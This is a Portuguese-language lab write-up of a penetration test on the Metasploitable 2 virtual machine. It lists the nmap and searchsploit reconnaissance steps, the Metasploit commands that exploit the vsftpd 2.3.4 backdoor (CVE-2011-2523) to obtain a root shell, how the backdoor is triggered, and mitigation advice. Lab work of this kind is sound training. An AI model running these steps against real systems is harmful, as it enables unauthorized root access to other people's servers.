# Write-up: Pentest na Máquina Metasploitable 2

Este é um relatório detalhado do teste de invasão realizado na máquina virtual Metasploitable 2, dentro de um ambiente de laboratório controlado.

**Máquina-Alvo:** Metasploitable 2

**Máquina de Ataque:** Kali Linux

**Objetivo:** Identificar vulnerabilidades, explorá-las para obter acesso inicial e escalar privilégios.

---

## Fase 1: Reconhecimento (Reconnaissance)

O primeiro passo foi identificar as portas e serviços rodando na máquina-alvo. Utilizei a ferramenta `nmap` com os seguintes comandos: **nmap -sV -p- 192.168.56.102**. O scan revelou várias portas abertas. A mais crítica parecia ser a porta 21 (FTP), que está rodando uma versão antiga: vsftpd 2.3.4.

<img width="646" height="517" alt="nmap-scan png" src="https://github.com/user-attachments/assets/41874998-8607-4181-8d77-e6d23cde642f" />

---

## Fase 2: Análise de Vulnerabilidade

Com foco no serviço vsftpd 2.3.4, usei o comando **searchsploit** para verificar por falhas conhecidas. O resultado confirmou que esta versão possui um backdoor crítico quee permite a execução remota de comandos.

<img width="646" height="215" alt="searchexploit png" src="https://github.com/user-attachments/assets/4dc6c711-1428-4723-b2c8-d2b7ac253e56" />

---

## Fase 3: Exploração

Encontradas as vulnerabilidades, iniciei o o processo de invasão do sistemas por meio de diversos comandos:
**msf6 > search vsftpd_234
  msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
  msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
  msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit**

<img width="635" height="230" alt="invasao png" src="https://github.com/user-attachments/assets/02a14128-052f-483b-9257-6d5b822f56db" />

---

## Fase 4: Pós-Exploração (Acesso Obtido)
**whoami**

**id**

Como prova de acesso, os comandos 'whoami' e 'id' foram executados, confirmando que o shell foi obtido com privilégios de root e controle total sobre o sistema-alvo.

<img width="647" height="93" alt="root png" src="https://github.com/user-attachments/assets/84bc62ab-28bc-4cf7-a61b-46d14f869a99" />

---

## Fase 5: Mitigação e Recomendações

Esta vulnerabilidade é considerada crítica, pois permite que um invasor não autenticado obtenha privilégios de root (controle total) remotamente com esforço mínimo.

  ### 1. Vulnerabilidade Identificada
  O serviço **vsftpd (Very Secure FTP Daemon)** na versão **2.3.4** possui um **backdoor intencional** (CVE-2011-2523). Este backdoor foi inserido no código-fonte por um invasor desconhecido e distribuído por um curto período. Ele é acionado quando um nome de usuário terminando com os caracteres `:)` é enviado, o que abre um shell de comando na porta 6200.
  
  ### 2. Recomendações de Correção (Mitigação)
  Para corrigir esta falha e proteger o servidor, as seguintes ações são recomendadas:
  
  * **Ação Primária (Correção):**
      Atualizar imediatamente o serviço `vsftpd` para a versão estável mais recente (qualquer versão após a 2.3.4). As versões mais novas não contêm este backdoor.
  
  * **Ação Secundária (Melhor Prática / Hardening):**
      Se o serviço de FTP (File Transfer Protocol) não for absolutamente essencial para as operações deste servidor, ele deve ser **desabilitado** ou **removido** completamente. Isso           reduz a *superfície de ataque*" do sistema, eliminando um ponto de entrada desnecessário para futuros ataques.
